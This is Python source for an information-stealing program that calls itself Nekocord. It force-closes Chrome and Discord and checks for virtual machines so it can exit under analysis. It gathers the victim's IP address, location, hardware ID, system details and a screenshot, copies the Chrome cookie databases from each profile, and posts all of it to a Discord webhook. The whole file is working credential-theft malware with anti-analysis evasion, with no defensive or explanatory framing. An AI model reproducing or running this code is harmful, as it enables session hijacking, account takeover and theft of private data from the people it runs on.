import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import uuid
import shutil
import base64
import random
import sqlite3
import win32crypt 
import datetime
import re
import wmi
import os
import pyautogui
import tempfile
import sys
import browser_cookie3
from Crypto.Cipher import AES
import ctypes

types = "@here"
h00k = ""

os.system("TASKKILL /F /IM chrome.exe")
os.system("TASKKILL /F /IM Discord.exe")
os.system("TASKKILL /F /IM DiscordPTB.exe")
os.system("cls") 

def iplogger():

    ipinfo = requests.get("https://ipinfo.io/json").json()

    ip = ipinfo.get("ip", "Unknown")
    citys = ipinfo.get("city", "Unknown")
    timezone = ipinfo.get("timezone", "Unknown")
    country = ipinfo.get("country", "Unknown")

    host = socket.gethostname()
    data = {
        "username": "Nekocord | Address",
        "avatar_url": "https://i.imgur.com/VF1uUWN.png", 
        "embeds": [{
            "title": "🏠️ IP INFO",
            "fields": [
                {
                    "name": "💻️ Host Name",
                    "value": f"{host}",
                    "inline": True
                },
                {
                    "name": "👀 IP Address",
                    "value": f"||{ip}||",
                    "inline": True
                },
                {
                    "name": "🌍️ location",
                    "value": f"{country} | {citys}",
                    "inline": True
                },
                {
                    "name": "🕒️ Timezone",
                    "value": f"{country} | {timezone}",
                    "inline": True
                }
            ],
            "footer": {
                "text": "nekocord. | https://github.com/zakocord/Nekocord"
            }
        }]
    }
    response = requests.post(h00k, json=data)

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        hwid = subprocess.check_output(command, shell=True, text=True).strip()
        return hwid
    
    current_machine_id = machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu_info = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    data2 = {
        "username": "Nekocord | Machine", 
        "content": f"{types}",
        "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        "embeds": [
            {
                "title": "💻️ Machine Info",
                "fields": [
                    {
                        "name": "💻️ PC",
                        "value": f"`{pc_name}`",
                        "inline": False
                    },
                    {
                        "name": "⌨️ OS: ",
                        "value": f"`{os_name}`",
                        "inline": False
                    },
                    {
                        "name": "📝 RAM",
                        "value": f"`{total_gb}GB`",
                        "inline": False
                    },
                    {
                        "name": "📺️ GPU",
                        "value": f"`{GPUm}`",
                        "inline": False
                    },
                    {
                        "name": "🖲️ CPU",
                        "value": f"`{cpu_info}`",
                        "inline": False
                    },
                    {
                        "name": "🔏 HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": False
                    }                       
                ],
                "footer": {
                    "text": "nekocord. | https://github.com/zakocord/Nekocord"
                }   
            }
        ]
    } 

    response2 = requests.post(h00k, json=data2)

def gen_filename(length=10):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {
            "username": "Nekocord | Screenshot", 
            "content": f"📸 Screenshot",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        }
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        pass
    else:
        pass


def is_virtual_machine_windows():
    try:
        command = [
            "powershell",
            "-Command",
            "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model"
        ]
        output = subprocess.check_output(command, stderr=subprocess.DEVNULL).decode().strip().lower()

        vm_keywords = ["virtual", "vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v", "parallels"]
        for keyword in vm_keywords:
            if keyword in output:
                pass
                return True
    except Exception as e:
        pass
    return False

def checker():
    is_vm = False


    hostname = socket.gethostname()
    if hostname.lower() == "apponfly-vps":
        pass
        is_vm = True


    if is_virtual_machine_windows():
        is_vm = True

    suspicious_processes = ["vmtoolsd.exe", "vboxservice.exe"]
    try:
        tasks = os.popen("tasklist").read().lower()
        for proc in suspicious_processes:
            if proc in tasks:
                pass
                is_vm = True
    except Exception as e:
        pass

    if is_vm:
        data_VM = {
            "username": "Nekocord | VM Detection",
            "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
        }

        try:
            requests.post(h00k, json=data_VM)
            time.sleep(2)
        except Exception as e:
            pass
        sys.exit(1)


def cookie_webhook(webhook_url, status_lines, cookie_db_path):
    try:
        requests.post(webhook_url, json={
            "username": "Nekocord | Cookie",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
            "embeds": [{
                "title": "🍪 Cookie Search",
                "description": "\n".join(status_lines) if status_lines else "No status available",
            }]
        })

        with open(cookie_db_path, 'rb') as f:
            data = {
                "username": "Nekocord | Cookie",
                "avatar_url": "https://i.imgur.com/VF1uUWN.png",
            }
            files = {'file': (os.path.basename(cookie_db_path), f)}
            requests.post(webhook_url, data=data, files=files)

    except Exception as e:
        pass

def extract_cookies(webhook_url):
    user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")
    profiles = [p for p in os.listdir(user_data_dir) if p.startswith("Profile") and os.path.isdir(os.path.join(user_data_dir, p))]
    
    if not profiles:
        pass
        return

    status_lines = []
    for profile in profiles:
        cookie_db_path = os.path.join(user_data_dir, profile, "Network", "Cookies")
        if os.path.exists(cookie_db_path):
            temp_db = os.path.join(os.environ['TEMP'], f"cookies")
            try:
                shutil.copy2(cookie_db_path, temp_db)
                status_lines.append(f"🍪 | {profile} | Found Cookie")
                cookie_webhook(webhook_url, status_lines, temp_db)
            except Exception as e:
                status_lines.append(f"🍪 {profile} | ERROR {str(e)}")
                if os.path.exists(temp_db):
                    os.remove(temp_db)

    if not status_lines:
        status_lines.append("🔴 Not Found Cookie")
        cookie_webhook(webhook_url, status_lines, os.path.join(os.environ['TEMP'], f"empty_{uuid.uuid4().hex}.db"))

def main():

    checker()
    machineinfo()
    iplogger()
    screenshot()
    extract_cookies(h00k)

main()
